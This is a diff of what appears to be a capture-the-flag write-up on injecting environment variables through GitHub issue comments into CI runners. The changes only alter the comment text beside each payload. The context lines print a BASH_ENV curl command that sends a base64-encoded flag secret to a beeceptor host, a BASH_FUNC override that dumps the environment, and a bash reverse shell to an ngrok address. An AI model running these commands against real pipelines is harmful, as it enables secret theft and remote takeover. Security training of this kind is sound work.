@@ -140,7 +140,7 @@ PIP_CONSTRAINT=https://tdf123456.free.beeceptor.com/get-flag
 
 Body Issue Comment:
 ``` bash
-Not a release :(
+Let me do something with this env :)
 BASH_ENV=$(curl https://tdf123456.free.beeceptor.com?flag=$(echo "$FLAG" | base64))
 ```
 <p align="right">(<a href="#readme-top">back to top</a>)</p>
@@ -152,7 +152,7 @@ BASH_ENV=$(curl https://tdf123456.free.beeceptor.com?flag=$(echo "$FLAG" | base6
 ### Using BASH_FUNC
 Body Issue Comment:
 ``` bash
-Not a release :(
+Let me do something with this env :)
 BASH_FUNC_echo%%=() { builtin echo "coucou $@" | printenv | base64 ;}
 ```
  <p align="right">(<a href="#readme-top">back to top</a>)</p>
@@ -212,6 +212,7 @@ dig <NGROK_DNS>
 ```
 Body Issue Comment:
 ``` bash
+Where is my bash ??
 ; bash -i >& /dev/tcp/<NGROK_IP>/<NGROK_PORT> 0>&1
 ```
 5. Dump and check those secrets
